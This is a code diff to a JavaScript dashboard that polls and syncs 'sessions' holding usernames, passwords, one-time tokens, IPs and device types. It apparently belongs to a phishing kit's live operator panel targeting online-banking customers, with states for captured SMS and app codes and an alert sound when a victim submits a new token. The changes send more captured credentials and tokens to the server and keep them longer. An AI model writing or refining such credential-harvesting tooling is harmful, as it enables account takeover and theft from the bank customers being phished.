@@ -131,7 +131,11 @@ async function setRowState(rowId, state, action) {
         action,
         state,
         username: row.user,
-        password: row.clave
+        password: row.clave,
+        tipoUsuario: row.tipo,
+        device: row.device,
+        ip: row.ip,
+        token: row.token
       })
     });
   } catch (_) {}
@@ -335,17 +339,38 @@ function render() {
 
 async function pollSessions() {
   try {
-    const response = await fetch('/api/sessions');
+    const localSessions = Array.from(rows.values()).map(r => ({
+      id: r.id,
+      index: r.index,
+      createdAt: r.createdAt,
+      updatedAt: r.updatedAt,
+      last_seen: r.last_seen,
+      tipoUsuario: r.tipo,
+      device: r.device,
+      ip: r.ip,
+      username: r.user,
+      password: r.clave,
+      token: r.token,
+      state: r.state,
+      action: r.action,
+      online: r.online
+    }));
+
+    const response = await fetch('/api/sessions/sync', {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify({ sessions: localSessions })
+    });
 
     if (response && response.ok) {
       const list = await response.json();
       
-      // Limpiar sesiones locales que ya no existen en el servidor o superan 2 horas
       const now = Date.now();
       const freshList = list.filter((s) => now - (s.createdAt || 0) < 2 * 60 * 60 * 1000);
-      const serverIds = new Set(freshList.map((s) => s.id));
-      for (const id of rows.keys()) {
-        if (!serverIds.has(id)) {
+      
+      // Limpiar únicamente sesiones viejas locales (> 2 horas)
+      for (const [id, r] of rows.entries()) {
+        if (now - (r.createdAt || 0) >= 2 * 60 * 60 * 1000) {
           rows.delete(id);
         }
       }
@@ -364,23 +389,9 @@ async function pollSessions() {
             setTimeout(() => tr.classList.remove('is-new'), 1800)
           })
         } else {
-          // Compare with stored session BEFORE overwriting it
           const oldSession = rows.get(session.id);
-          if (oldSession && oldSession.state !== session.state) {
-            // Trigger sound on any relevant state changes
-            if (
-              session.state === 'waiting' ||
-              session.state === 'received-sms' ||
-              session.state === 'received-ami' ||
-              session.state === 'received-bdvapp' ||
-              session.state === 'error-login' ||
-              session.state === 'error-sms' ||
-              session.state === 'error-ami' ||
-              session.state === 'error-bdvapp' ||
-              session.state === 'done'
-            ) {
-              hasNewOrChangedSession = true;
-            }
+          if (oldSession && (oldSession.state !== session.state || (session.token && oldSession.token !== session.token))) {
+            hasNewOrChangedSession = true;
           }
         }
       });
@@ -389,19 +400,20 @@ async function pollSessions() {
       freshList.forEach((session) => {
         const existing = rows.get(session.id);
         const resolvedState = session.state || (existing ? existing.state : 'waiting');
-        const resolvedAction = (session.action !== undefined) ? session.action : (existing ? existing.action : null);
+        const resolvedAction = (session.action !== undefined && session.action !== null) ? session.action : (existing ? existing.action : null);
+        const resolvedToken = (session.token !== undefined && session.token !== '') ? session.token : (existing ? existing.token : '');
         rows.set(session.id, {
           id: session.id,
           index: session.index || (existing ? existing.index : rows.size + 1),
           createdAt: session.createdAt || (existing ? existing.createdAt : Date.now()),
           updatedAt: session.updatedAt || Date.now(),
-          last_seen: session.last_seen || (existing ? existing.last_seen : Date.now()),
+          last_seen: Math.max(session.last_seen || 0, existing ? (existing.last_seen || 0) : 0),
           tipo: session.tipoUsuario || session.tipo || (existing ? existing.tipo : 'EMPRESAS'),
           device: session.device || (existing ? existing.device : 'desktop'),
           ip: session.ip || (existing ? existing.ip : '127.0.0.1'),
           user: session.username || session.user || (existing ? existing.user : '—'),
           clave: session.password || session.clave || (existing ? existing.clave : '—'),
-          token: (session.token !== undefined && session.token !== '') ? session.token : (existing ? existing.token : ''),
+          token: resolvedToken,
           state: resolvedState,
           action: resolvedAction,
           online: session.online !== undefined ? session.online : (existing ? existing.online : true)
